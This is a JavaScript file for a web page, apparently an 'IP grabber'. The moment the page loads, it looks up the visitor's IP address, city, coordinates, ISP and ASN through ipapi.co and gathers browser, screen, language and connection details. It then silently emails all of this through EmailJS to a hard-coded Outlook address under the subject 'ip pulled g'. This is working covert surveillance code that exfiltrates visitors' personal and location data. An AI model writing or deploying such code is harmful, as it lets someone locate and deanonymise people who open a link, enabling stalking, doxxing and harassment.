// Initialize EmailJS with your public key
emailjs.init("2jj19BTFwlNnm8fp_");

async function sendEmail(data) {
    const emailData = {
        to_email: "openeyes08@outlook.com",
        subject: "ip pulled g ",
        message: `
IP Address: ${data.ip}
Location: ${data.location}
ISP: ${data.isp}
Country: ${data.country}
Timezone: ${data.timezone}
Coordinates: ${data.coords}
ASN: ${data.asn}
User Agent: ${data.useragent}
Screen: ${data.screen}
Language: ${data.lang}
Connection: ${data.connection}
Time: ${new Date().toLocaleString()}
        `
    };
    
    try {
        document.getElementById('email-status').textContent = 'sending email...';
        await emailjs.send("service_14u2qeo", "template_psyarye", emailData);
        document.getElementById('email-status').textContent = 'email sent successfully';
    } catch (error) {
        console.error('Email failed:', error);
        document.getElementById('email-status').textContent = 'email failed to send';
    }
}

async function loadData() {
    const btn = document.getElementById('refresh-btn');
    btn.textContent = 'loading...';
    btn.disabled = true;
    
    let collectedData = {};
    
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        // Update all info instantly
        document.getElementById('ip').textContent = data.ip || 'unable to fetch';
        collectedData.ip = data.ip || 'unable to fetch';
        
        const location = `${data.city || 'unknown'}, ${data.region || 'unknown'}, ${data.country_name || 'unknown'}`;
        document.getElementById('location').textContent = location;
        collectedData.location = location;
        
        document.getElementById('isp').textContent = data.org || 'unknown provider';
        collectedData.isp = data.org || 'unknown provider';
        
        const country = `${data.country_code || 'unknown'} (${data.country_calling_code || 'n/a'})`;
        document.getElementById('country').textContent = country;
        collectedData.country = country;
        
        document.getElementById('timezone').textContent = data.timezone || 'unknown timezone';
        collectedData.timezone = data.timezone || 'unknown timezone';
        
        const coords = `${data.latitude || 'unknown'}, ${data.longitude || 'unknown'}`;
        document.getElementById('coords').textContent = coords;
        collectedData.coords = coords;
        
        const asn = `AS${data.asn || 'unknown'} - ${data.network || 'unknown network'}`;
        document.getElementById('asn').textContent = asn;
        collectedData.asn = asn;
        
    } catch (error) {
        console.error('failed to fetch ip data:', error);
        document.getElementById('ip').textContent = 'error fetching data';
        collectedData.ip = 'error fetching data';
        collectedData.location = 'error';
        collectedData.isp = 'error';
        collectedData.country = 'error';
        collectedData.timezone = 'error';
        collectedData.coords = 'error';
        collectedData.asn = 'error';
    }
    
    // Browser/system info
    document.getElementById('useragent').textContent = navigator.userAgent;
    collectedData.useragent = navigator.userAgent;
    
    const screen = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}bit)`;
    document.getElementById('screen').textContent = screen;
    collectedData.screen = screen;
    
    const lang = `${navigator.language || 'unknown'} (${navigator.languages?.join(', ') || 'n/a'})`;
    document.getElementById('lang').textContent = lang;
    collectedData.lang = lang;
    
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const connectionInfo = connection ? `${connection.effectiveType || 'unknown'} - ${connection.downlink || 'unknown'}mbps` : 'connection info unavailable';
    document.getElementById('connection').textContent = connectionInfo;
    collectedData.connection = connectionInfo;
    
    document.getElementById('dns').textContent = 'dns info requires additional permissions';
    collectedData.dns = 'dns info requires additional permissions';
    
    // Send email with all data
    await sendEmail(collectedData);
    
    btn.textContent = 'refresh data';
    btn.disabled = false;
}

function refresh() {
    loadData();
}

document.addEventListener('DOMContentLoaded', loadData);
